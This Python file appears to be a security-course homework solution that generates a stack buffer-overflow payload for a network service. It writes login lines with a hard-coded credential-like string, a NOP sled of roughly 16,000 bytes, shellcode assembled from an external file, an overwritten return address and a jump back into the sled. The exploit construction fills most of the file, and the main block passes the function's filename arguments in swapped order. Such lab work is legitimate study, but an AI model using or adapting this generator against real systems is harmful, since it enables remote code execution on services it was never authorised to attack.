import os
from sys import argv

def yank_binary_content(binary_filename: str, binary_start_token: bytes, binary_end_token: bytes) -> bytes:
	"""returns binary content of file between binary_start_token and binary_end_token"""
	with open(binary_filename, "rb") as f:
		content = f.read()
		start_index = content.find(binary_start_token)
		#check if not found and print error:
		if start_index == -1:
			print(f"Error: {binary_start_token=} not found in {binary_filename}")
			exit(1)
		end_index = content.find(binary_end_token)
		#check not find:
		if end_index == -1:
			print(f"Error: {binary_end_token=} not found in {binary_filename}")
			exit(1)
		return content[start_index+len(binary_start_token):end_index]

class ShellCodeGenerator:
	def __init__(self) -> None:
		self.content = b""

	def append_strline(self, line: str):
		self.content += line.encode("ascii") + b"\n"

	def nop_cascade(self, num_nops: int):
		self.content += num_nops*b"\x90"
	
	def load_from_asm_file(self, asm_filename: str):
		"""adds appropriate binary content of instructions from assembly file from to end of our output"""
		# remove .asm extension from filename:
		obj_filename = asm_filename[:-len("S")]+"o"

		id_prefix = ".intel_syntax noprefix\n"+"xor eax, 0\n"*4
		id_suffix = "\n"+"xor ebx, 0\n"*4
		binary_start_token = b"\x83\xf0\x00"*4
		binary_end_token = b"\x83\xf3\x00"*4

		tmp_asm_filename = "__tmp__"+asm_filename
		#copy asm file to tmp file with id_prefix at top:
		with open(tmp_asm_filename, "w") as f:
			f.write(id_prefix)
			with open(asm_filename, "r") as g:
				f.write(g.read())
			f.write(id_suffix)

		# call assembler on asm from file (exit if fails):

		if os.system(f"gcc32 -Werror -c {tmp_asm_filename} -o {obj_filename}") != 0:
			print(f"Error: assembler failed on {asm_filename}")
			exit(1)

		# append binary assembler output to content:
		self.content += yank_binary_content(obj_filename, binary_start_token, binary_end_token)

	def start_buffer_cnt(self):
		self.buff_start_offset = len(self.content)

	def comptete_buffer_to_size(self, size: int):
		buf_cur_offset = len(self.content)
		bytes_written_so_far = buf_cur_offset - self.buff_start_offset
		if size < bytes_written_so_far:
			print(f"Error: requested to complete buffer to size {size} but {bytes_written_so_far} were already written")
		self.nop_cascade(size-bytes_written_so_far)

	def append_byte(self, byte_value: int):
		self.content += bytes([byte_value])

	def append_dword(self, dword_value: int):
		self.content += dword_value.to_bytes(4, "little")

	def write_to_file(self, output_filename: str):
		with open(output_filename, "wb") as f:
			f.write(self.content)

	def append_asmline(self, line: str):
		tmp_asm_filename = "append_asmline_tmp.S"
		with open(tmp_asm_filename, "w") as f:
			f.write(line)
		self.load_from_asm_file(tmp_asm_filename)

	def append_zeros(self, num_zeros: int):
		self.content += num_zeros*b"\x00"


def hw4_p3_filegen(output_filename, asm_input_filename):
	"""
	char* path, *srv_output_buf;
	while(true){
		scanf("%s", path);
		handle_req(socket_ptr, 7, path, srv_output_buf, 0);
	}
	"""
	gen = ShellCodeGenerator()
	gen.append_strline("archer")
	gen.append_strline("FKGXJP0OCE1LKT3D")
	gen.append_strline("PEEK")
	
	gen.start_buffer_cnt()
	gen.nop_cascade(16004)
	gen.load_from_asm_file(asm_input_filename)
	gen.comptete_buffer_to_size(16304)#
	gen.append_dword(0x62502028)
	gen.append_asmline("jmp -330")
	gen.append_strline("")
	
	gen.append_strline("*")
	gen.append_strline("database")

	gen.write_to_file(output_filename)


if __name__ == "__main__":
	asm_input_filename = "shellcode.S"
	output_filename = "shellcode.bin"
	#if one of cmd inputs has .S extension, assume it is the asm input filename and same with output and .bin:
	for arg in argv[1:]:
		if arg.endswith(".S"):
			asm_input_filename = arg
			break
		elif arg.endswith(".bin"):
			output_filename = arg
			break
	hw4_p3_filegen(asm_input_filename, output_filename)
